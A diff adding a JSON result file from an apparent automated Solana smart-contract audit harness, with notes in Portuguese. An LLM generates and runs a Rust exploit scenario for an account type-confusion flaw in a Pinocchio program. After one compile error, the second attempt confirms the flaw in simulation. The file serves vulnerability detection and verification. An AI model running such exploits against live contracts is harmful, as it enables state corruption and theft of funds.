@@ -1,0 +1,135 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2505,
+        "completion_tokens": 897,
+        "latency_s": 5.25
+      },
+      "raw": "{\n  \"plan\": \"O programa set_value (Pinocchio) escreve diretamente nos offsets 8..40 (user), 40..48 (value) e 48 (bump) da conta de dados, sem verificar discriminador de tipo. O PDA e derivado de [b\\\"data\\\", user.key(), bump] e a unica validacao e que a conta passada seja esse PDA. Para o ataque COSPLAY, criamos uma conta no endereco do PDA com um layout de outro tipo (discriminador diferente do esperado), passamos essa conta como data_account e chamamos set_value com um user e value arbitrarios. O baseline usa a mesma instrucao com uma conta de dados com o layout esperado (discriminador correto) e deve ter sucesso; o ataque usa a conta com layout diferente e, se aceito, sobrescreve os offsets 8..48, corrompendo o estado de uma conta de outro tipo. O efeito medido e que os bytes 8..40 da conta apos o ataque sao iguais a chave do user do ataque, provando que o programa tratou uma conta de tipo diferente como a conta de dados.\",\n  \"scenario\": \"let user = Pubkey::new_unique();\\nlet bump: u8 = 255;\\nlet (pda, _) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\n// Conta de dados legitima: discriminador do tipo esperado + campos\\nlet legit_data = anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, bump));\\nlet legit_account = account(&env.program_id, &legit_data, None);\\n\\n// Conta COSPLAY: mesmo endereco PDA, mas com layout/discriminador de outro tipo\\nlet cosplay_data = anchor_account_data(\\\"OtherAccount\\\", &(Pubkey::new_unique(), 123u64, 7u8));\\nlet cosplay_account = account(&env.program_id, &cosplay_data, None);\\n\\nlet value: u64 = 0xDEADBEEFCAFEBABE;\\nlet ix_data = [IX_SET_VALUE, bump, value.to_le_bytes()[0], value.to_le_bytes()[1], value.to_le_bytes()[2], value.to_le_bytes()[3], value.to_le_bytes()[4], value.to_le_bytes()[5], value.to_le_bytes()[6], value.to_le_bytes()[7]];\\n\\nlet metas = vec![\\n    AccountMeta::new(pda, false),\\n    AccountMeta::new_readonly(user, false),\\n];\\n\\n// Baseline: conta de dados com o layout esperado\\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\\nlet baseline_accounts = vec![(pda, legit_account), (user, wallet(1_000_000_000))];\\nlet base = env.baseline(\\\"set_value com conta de dados legitima\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: mesma instrucao, mas conta de dados com layout de outro tipo\\nlet attack_ix = env.raw_ix(&ix_data, metas);\\nlet attack_accounts = vec![(pda, cosplay_account), (user, wallet(1_000_000_000))];\\nlet r = env.attack(\\\"set_value com conta de dados de outro tipo (COSPLAY)\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data_after = after(&r, &pda).data();\\n    let user_bytes = user.to_bytes();\\n    let overwritten = data_after.len() >= 40 && data_after[8..40] == user_bytes;\\n    env.effect(\\\"conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user\\\", overwritten);\\n}\"\n}",
+      "plan": "O programa set_value (Pinocchio) escreve diretamente nos offsets 8..40 (user), 40..48 (value) e 48 (bump) da conta de dados, sem verificar discriminador de tipo. O PDA e derivado de [b\"data\", user.key(), bump] e a unica validacao e que a conta passada seja esse PDA. Para o ataque COSPLAY, criamos uma conta no endereco do PDA com um layout de outro tipo (discriminador diferente do esperado), passamos essa conta como data_account e chamamos set_value com um user e value arbitrarios. O baseline usa a mesma instrucao com uma conta de dados com o layout esperado (discriminador correto) e deve ter sucesso; o ataque usa a conta com layout diferente e, se aceito, sobrescreve os offsets 8..48, corrompendo o estado de uma conta de outro tipo. O efeito medido e que os bytes 8..40 da conta apos o ataque sao iguais a chave do user do ataque, provando que o programa tratou uma conta de tipo diferente como a conta de dados.",
+      "scenario": "let user = Pubkey::new_unique();\nlet bump: u8 = 255;\nlet (pda, _) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\n// Conta de dados legitima: discriminador do tipo esperado + campos\nlet legit_data = anchor_account_data(\"DataAccount\", &(user, 0u64, bump));\nlet legit_account = account(&env.program_id, &legit_data, None);\n\n// Conta COSPLAY: mesmo endereco PDA, mas com layout/discriminador de outro tipo\nlet cosplay_data = anchor_account_data(\"OtherAccount\", &(Pubkey::new_unique(), 123u64, 7u8));\nlet cosplay_account = account(&env.program_id, &cosplay_data, None);\n\nlet value: u64 = 0xDEADBEEFCAFEBABE;\nlet ix_data = [IX_SET_VALUE, bump, value.to_le_bytes()[0], value.to_le_bytes()[1], value.to_le_bytes()[2], value.to_le_bytes()[3], value.to_le_bytes()[4], value.to_le_bytes()[5], value.to_le_bytes()[6], value.to_le_bytes()[7]];\n\nlet metas = vec![\n    AccountMeta::new(pda, false),\n    AccountMeta::new_readonly(user, false),\n];\n\n// Baseline: conta de dados com o layout esperado\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\nlet baseline_accounts = vec![(pda, legit_account), (user, wallet(1_000_000_000))];\nlet base = env.baseline(\"set_value com conta de dados legitima\", &baseline_ix, &baseline_accounts);\n\n// Ataque: mesma instrucao, mas conta de dados com layout de outro tipo\nlet attack_ix = env.raw_ix(&ix_data, metas);\nlet attack_accounts = vec![(pda, cosplay_account), (user, wallet(1_000_000_000))];\nlet r = env.attack(\"set_value com conta de dados de outro tipo (COSPLAY)\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data_after = after(&r, &pda).data();\n    let user_bytes = user.to_bytes();\n    let overwritten = data_after.len() >= 40 && data_after[8..40] == user_bytes;\n    env.effect(\"conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user\", overwritten);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_SET_VALUE` in this scope\n  --> tests/attempt.rs:22:20\n   |\n22 |     let ix_data = [IX_SET_VALUE, bump, value.to_le_bytes()[0], value.t...\n   |                    ^^^^^^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_SET_VALUE` in this scope\n  --> tests/attempt.rs:22:20\n   |\n22 |     let ix_data = [IX_SET_VALUE, bump, value.to_le_bytes()[0], value.t...\n   |                    ^^^^^^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3247,
+        "completion_tokens": 774,
+        "latency_s": 4.14
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta PDA derivada de [b\\\"data\\\", user, bump] com layout de outro tipo (discriminador diferente) e uma conta de usuario. O baseline usa a mesma instrucao set_value com uma conta de dados com o layout esperado, provando que o cenario esta correto. O ataque repete a instrucao, mas substitui a conta de dados por uma conta de outro tipo no mesmo endereco PDA. Se o programa aceitar, ele sobrescrevera os offsets 8..40 com a chave do usuario, corrompendo o estado de uma conta de tipo diferente; o efeito mede essa sobrescrita.\",\n  \"scenario\": \"let user = Pubkey::new_unique();\\nlet bump: u8 = 255;\\nlet (pda, _) = Pubkey::find_program_address(&[b\\\"data\\\", user.as_ref()], &env.program_id);\\n\\n// Conta de dados legitima: discriminador do tipo esperado + campos\\nlet legit_data = anchor_account_data(\\\"DataAccount\\\", &(user, 0u64, bump));\\nlet legit_account = account(&env.program_id, &legit_data, None);\\n\\n// Conta COSPLAY: mesmo endereco PDA, mas com layout/discriminador de outro tipo\\nlet cosplay_data = anchor_account_data(\\\"OtherAccount\\\", &(Pubkey::new_unique(), 123u64, 7u8));\\nlet cosplay_account = account(&env.program_id, &cosplay_data, None);\\n\\nlet value: u64 = 0xDEADBEEFCAFEBABE;\\nlet mut ix_data = [0u8; 10];\\nix_data[0] = 0; // IX_SET_VALUE\\nix_data[1] = bump;\\nix_data[2..10].copy_from_slice(&value.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(pda, false),\\n    AccountMeta::new_readonly(user, false),\\n];\\n\\n// Baseline: conta de dados com o layout esperado\\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\\nlet baseline_accounts = vec![(pda, legit_account), (user, wallet(1_000_000_000))];\\nlet _base = env.baseline(\\\"set_value com conta de dados legitima\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: mesma instrucao, mas conta de dados com layout de outro tipo\\nlet attack_ix = env.raw_ix(&ix_data, metas);\\nlet attack_accounts = vec![(pda, cosplay_account), (user, wallet(1_000_000_000))];\\nlet r = env.attack(\\\"set_value com conta de dados de outro tipo (COSPLAY)\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let data_after = after(&r, &pda).data();\\n    let user_bytes = user.to_bytes();\\n    let overwritten = data_after.len() >= 40 && data_after[8..40] == user_bytes;\\n    env.effect(\\\"conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user\\\", overwritten);\\n}\"\n}",
+      "plan": "Preparo uma conta PDA derivada de [b\"data\", user, bump] com layout de outro tipo (discriminador diferente) e uma conta de usuario. O baseline usa a mesma instrucao set_value com uma conta de dados com o layout esperado, provando que o cenario esta correto. O ataque repete a instrucao, mas substitui a conta de dados por uma conta de outro tipo no mesmo endereco PDA. Se o programa aceitar, ele sobrescrevera os offsets 8..40 com a chave do usuario, corrompendo o estado de uma conta de tipo diferente; o efeito mede essa sobrescrita.",
+      "scenario": "let user = Pubkey::new_unique();\nlet bump: u8 = 255;\nlet (pda, _) = Pubkey::find_program_address(&[b\"data\", user.as_ref()], &env.program_id);\n\n// Conta de dados legitima: discriminador do tipo esperado + campos\nlet legit_data = anchor_account_data(\"DataAccount\", &(user, 0u64, bump));\nlet legit_account = account(&env.program_id, &legit_data, None);\n\n// Conta COSPLAY: mesmo endereco PDA, mas com layout/discriminador de outro tipo\nlet cosplay_data = anchor_account_data(\"OtherAccount\", &(Pubkey::new_unique(), 123u64, 7u8));\nlet cosplay_account = account(&env.program_id, &cosplay_data, None);\n\nlet value: u64 = 0xDEADBEEFCAFEBABE;\nlet mut ix_data = [0u8; 10];\nix_data[0] = 0; // IX_SET_VALUE\nix_data[1] = bump;\nix_data[2..10].copy_from_slice(&value.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(pda, false),\n    AccountMeta::new_readonly(user, false),\n];\n\n// Baseline: conta de dados com o layout esperado\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\nlet baseline_accounts = vec![(pda, legit_account), (user, wallet(1_000_000_000))];\nlet _base = env.baseline(\"set_value com conta de dados legitima\", &baseline_ix, &baseline_accounts);\n\n// Ataque: mesma instrucao, mas conta de dados com layout de outro tipo\nlet attack_ix = env.raw_ix(&ix_data, metas);\nlet attack_accounts = vec![(pda, cosplay_account), (user, wallet(1_000_000_000))];\nlet r = env.attack(\"set_value com conta de dados de outro tipo (COSPLAY)\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let data_after = after(&r, &pda).data();\n    let user_bytes = user.to_bytes();\n    let overwritten = data_after.len() >= 40 && data_after[8..40] == user_bytes;\n    env.effect(\"conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user\", overwritten);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "set_value com conta de dados legitima",
+            "result": "Success",
+            "compute_units": 1824,
+            "account_flags": "-w,-r",
+            "ix_head": "00ffbebafecaefbe",
+            "accounts": [
+              {
+                "key": "G8xjDo9cSQYsEbjjcdBf6JJt2HXggQwQcwULCUa6NZKW",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "55f0b69e4c0712e9",
+                "digest": "5b171aa72ff65964",
+                "post": "55f0b69e4c0712e90000000000000002000000000000000000000000000000000000000000000000bebafecaefbeaddeff"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value com conta de dados de outro tipo (COSPLAY)",
+            "result": "Success",
+            "compute_units": 1824,
+            "account_flags": "-w,-r",
+            "ix_head": "00ffbebafecaefbe",
+            "accounts": [
+              {
+                "key": "G8xjDo9cSQYsEbjjcdBf6JJt2HXggQwQcwULCUa6NZKW",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "e24fc2c0d082b868",
+                "digest": "1692f22ae8925017",
+                "post": "e24fc2c0d082b8680000000000000002000000000000000000000000000000000000000000000000bebafecaefbeaddeff"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1824 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1824 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta de outro tipo foi aceita e teve os offsets 8..40 sobrescritos com a chave do user"
+    }
+  ],
+  "case_id": "SSP-05-P-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let mut data = data_account.try_borrow_mut_data()?;\ndata[8..40].copy_from_slice(user.key().as_ref());\ndata[40..48].copy_from_slice(&value.to_le_bytes());\ndata[48] = bump;",
+    "explanation": "Os dados da conta sao acessados e escritos diretamente por offsets, sem verificar um discriminador de tipo no inicio do buffer. Nao ha validacao de que a conta contem a estrutura esperada, permitindo que uma conta de layout diferente seja tratada como a conta de dados.",
+    "attack_hypothesis": "Um atacante fornece uma conta com layout de dados diferente (de outro tipo) cujo endereco corresponda ao PDA, e o programa sobrescreve campos interpretando-os como `user`/`value`/`bump`, corrompendo o estado."
+  }
+}
